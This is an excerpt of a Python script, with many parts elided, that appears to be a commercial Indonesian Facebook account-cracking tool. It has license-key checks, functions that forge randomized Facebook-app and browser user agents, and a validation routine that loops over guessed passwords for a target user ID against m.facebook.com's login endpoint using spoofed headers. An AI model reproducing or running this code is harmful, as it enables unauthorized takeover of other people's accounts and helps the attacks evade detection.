...
def menu():
	...
	try:
		...
		if asuu["status"] == "error":
			print("");print(f"😔 {asuu['msg'].replace('Anda telah menggunakan semua device yang tersisa, chat admin untuk menghapusnya', 'Akses login di tolak! Dikarenakan anda sudah login di device atau perangkat sebelumnya.')}");exit()
		elif asuu["status"] in ["kadaluarsa", "sudah kadaluarsa"]:
			print("");print("😔 oppsh key anda telah mencapai batas masa aktif nya, silahkan upgrade ke premium.");time.sleep(5);lisensi()
	except KeyError:print("");print(f"😔 {asuu['msg'].replace('Anda telah menggunakan semua device yang tersisa, chat admin untuk menghapusnya', 'Akses login di tolak! Dikarenakan anda sudah login di device atau perangkat sebelumnya.')}");exit()
	except UnboundLocalError:lisensi()
	except (json.decoder.JSONDecodeError, URLError):print("");print("😔 gagal menghubungkan ke server, silahkan cek koneksi anda dan mainkan mode pesawat 5 detik.");exit()
	print(
		f"""
...
def dalvik():
	rr = random.randint
	rc = random.choice
	return rc([f"Dalvik/2.1.0 (Linux; U; Android 10; W-V730-TVM Build/QP1A.190711.020) [FBAN/FB4A;FBAV/{str(rr(410,450))}.0.0.{str(rr(15,35))}.{str(rr(50,150))};FBPN/com.facebook.katana;FBLC/in_ID;FBBV/{str(rr(510000000,599999999))};FBCR/INDOSAT;FBMF/WIKO;FBBD/WIKO;FBDV/W-V730-TVM;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=1.4875001,width=1479,height=720};FB_FW/1;FBRV/518305928;] FBBK/1"])
def ua_valid():
	rr = random.randint
	rc = random.choice
...
def ugen():
	...
	AA = f"Mozilla/5.0 (Linux; Android 11; INKOSI_PRO Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,105))}.0.{str(rr(1111,4444))}.{str(rr(45,250))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/441.1.0.39.109;]"
...
def generateuseragentmozilla():
	...
	versii___ = rr(50,105)
	versii____ = rr(6,9)
	user1 = f"Mozilla/5.0 (Linux; Android 8.0.0; Android TV Build/OPR5.170623.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versii___}.0.{str(rr(1111,4444))}.{str(rr(50,150))} Mobile Safari/537.36"
	...
	user3 = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/12.2.6-16532841+++Portal+Release-Live UnrealEngine/4.23.0-16532841+++Portal+Release-Live Chrome/{versii___}.0.{str(rr(1111,4444))}.{str(rr(50,150))} Safari/537.36"
	user4 = f"Dalvik/2.1.0 (Linux; U; Android 13; V2231 Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/{str(rr(400,450))}.0.0.30.110;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/{str(rr(510000000,590000000))};FBCR/Telkomsel;FBMF/vivo;FBBD/vivo;FBDV/V2231;FBSV/13;FBCA/arm64-v8a:null;FBDM/"+"{density=2.75,width=1080,height=2197};FB_FW/1;] FBBK/1"
	uaappend = rc([user3])
	return uaappend
...
def ugen2():
	...
	rc = random.choice
	konn = f"{str(rr(11,14))}"
	toll = f"Chrome/{str(rr(30,114))}.0.{str(rr(3000,5555))}.{str(rr(30,150))}"
	#return rc([f"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,114))}.0.{str(rr(3000,5555))}.{str(rr(30,150))} AlohaBrowser/0.{str(rr(1,9))}.{str(rr(1,9))}.0 Safari/537.36"])
	return rc([f"Mozilla/5.0 (Linux; U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,114))}.0.{str(rr(3000,5555))}.{str(rr(30,150))} Mobile Safari/537.36 (SmartTV/8.5) (NetCast) (Android)"])
###-----[ METODE VALIDATE ]-----###
def _validate_(uid,pasw):
	...
	for pw in pasw:
		try:
			...
			link = ses.get("https://m.facebook.com/login/device-based/password/?uid="+uid+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Facredirect%2F%3Fdeeplink_destination%3Dupgrade_account%26entrypoint%3Dmfb_m_site%26wtsid%3Drdr_0xZJHTvuyCTnctKLI&refsrc=deprecated&wtsid=rdr_0xZJHTvuyCTnctKLI&_rdr")
			...
			headd = {"Host": "m.facebook.com","content-length": "338","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/device-based/password/?uid="+uid+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Facredirect%2F%3Fdeeplink_destination%3Dupgrade_account%26entrypoint%3Dmfb_m_site%26wtsid%3Drdr_0xZJHTvuyCTnctKLI&refsrc=deprecated&wtsid=rdr_0xZJHTvuyCTnctKLI&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
